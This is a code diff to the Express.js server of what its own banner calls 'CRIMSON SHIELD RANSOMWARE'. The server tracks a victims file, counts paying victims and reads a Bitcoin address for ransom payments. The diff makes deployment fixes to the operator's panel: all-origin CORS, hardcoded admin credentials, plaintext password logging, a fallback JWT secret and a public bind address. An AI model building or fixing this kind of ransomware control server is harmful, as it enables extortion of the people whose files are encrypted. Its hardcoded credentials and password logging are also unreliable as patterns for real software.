@@ -18,7 +18,11 @@ if (!fs.existsSync(path.join(__dirname, 'database'))) {
 
 let victims = [];
 if (fs.existsSync(VICTIMS_FILE)) {
-    victims = JSON.parse(fs.readFileSync(VICTIMS_FILE, 'utf8'));
+    try {
+        victims = JSON.parse(fs.readFileSync(VICTIMS_FILE, 'utf8'));
+    } catch (e) {
+        victims = [];
+    }
 }
 
 function saveVictims() {
@@ -66,7 +70,12 @@ class CrimsonServer {
     constructor() {
         this.app = express();
         this.server = createServer(this.app);
-        this.io = new Server(this.server, { cors: { origin: '*' } });
+        this.io = new Server(this.server, { 
+            cors: { 
+                origin: '*',
+                methods: ['GET', 'POST']
+            } 
+        });
         this.port = process.env.PORT || 3001;
         this.encryptionEngine = new EncryptionEngine();
         this.victimId = crypto.randomBytes(8).toString('hex');
@@ -78,17 +87,40 @@ class CrimsonServer {
     }
 
     setupMiddleware() {
-        this.app.use(cors());
-        this.app.use(express.json());
+        // 🔴 FIXED CORS - Allow all origins
+        this.app.use(cors({
+            origin: '*',
+            methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+            allowedHeaders: ['Content-Type', 'Authorization']
+        }));
+        
+        // 🔴 FIXED Body Parser - Make sure it's working
+        this.app.use(express.json({ limit: '50mb' }));
+        this.app.use(express.urlencoded({ extended: true, limit: '50mb' }));
         this.app.use(express.static('public'));
         
+        // 🔴 ADDED: Log all requests for debugging
+        this.app.use((req, res, next) => {
+            console.log(`📝 ${req.method} ${req.url}`);
+            if (req.method === 'POST' && req.url === '/api/admin/login') {
+                console.log('📦 Login request body:', req.body);
+            }
+            next();
+        });
+        
+        // 🔴 FIXED: Admin auth middleware
         this.app.use('/api/admin/*', (req, res, next) => {
+            // Skip auth for login route
+            if (req.url === '/login' || req.path === '/login') {
+                return next();
+            }
+            
             const token = req.headers['authorization'];
             if (!token) {
-                return res.status(401).json({ error: 'Unauthorized' });
+                return res.status(401).json({ error: 'Unauthorized - No token' });
             }
             try {
-                const decoded = jwt.verify(token, process.env.JWT_SECRET || 'fallback_secret');
+                const decoded = jwt.verify(token.replace('Bearer ', ''), process.env.JWT_SECRET || 'fallback_secret');
                 req.admin = decoded;
                 next();
             } catch (error) {
@@ -119,26 +151,40 @@ class CrimsonServer {
             res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
         });
 
-        // ===== ADMIN ROUTES =====
-        // 🔴 FIXED LOGIN - Hardcoded credentials
+        // ===== 🔴 FIXED ADMIN LOGIN =====
         this.app.post('/api/admin/login', (req, res) => {
+            console.log('🔐 Login attempt received');
+            console.log('📦 Request body:', req.body);
+            
             const { username, password } = req.body;
             
-            // HARDCODED CREDENTIALS - FIX FOR RAILWAY
+            // Hardcoded credentials
             const validUsername = 'admin';
             const validPassword = 'crimsonadmin';
             
-            console.log(`Login attempt: ${username} / ${password}`); // Debug log
+            console.log(`👤 Username: ${username}, Password: ${password}`);
+            console.log(`✅ Expected: ${validUsername} / ${validPassword}`);
+            
+            if (!username || !password) {
+                console.log('❌ Missing username or password');
+                return res.status(400).json({ error: 'Username and password required' });
+            }
             
             if (username === validUsername && password === validPassword) {
-                const token = jwt.sign({ admin: true }, process.env.JWT_SECRET || 'fallback_secret', { expiresIn: '24h' });
+                const token = jwt.sign(
+                    { admin: true, username: username }, 
+                    process.env.JWT_SECRET || 'fallback_secret', 
+                    { expiresIn: '24h' }
+                );
+                console.log('✅ Login successful!');
                 res.json({ success: true, token });
             } else {
-                console.log('❌ Invalid login attempt');
+                console.log('❌ Invalid credentials');
                 res.status(401).json({ error: 'Invalid credentials' });
             }
         });
 
+        // ===== ADMIN ROUTES =====
         this.app.get('/api/admin/dashboard', (req, res) => {
             const totalVictims = victims.length;
             const paidVictims = victims.filter(v => v.paid).length;
@@ -311,6 +357,17 @@ class CrimsonServer {
                 timestamp: new Date().toISOString()
             });
         });
+
+        // ===== 🔴 ADDED: Test route for debugging =====
+        this.app.get('/api/test', (req, res) => {
+            res.json({ 
+                message: 'Server is running!',
+                env: {
+                    port: this.port,
+                    hasBTC: !!process.env.BTC_ADDRESS
+                }
+            });
+        });
     }
 
     setupWebSocket() {
@@ -364,7 +421,7 @@ class CrimsonServer {
     }
 
     start() {
-        this.server.listen(this.port, () => {
+        this.server.listen(this.port, '0.0.0.0', () => {
             const btcAddress = process.env.BTC_ADDRESS || 'Not Set';
             console.log('╔═══════════════════════════════════════════╗');
             console.log('║     🔴 CRIMSON SHIELD RANSOMWARE 🔴       ║');
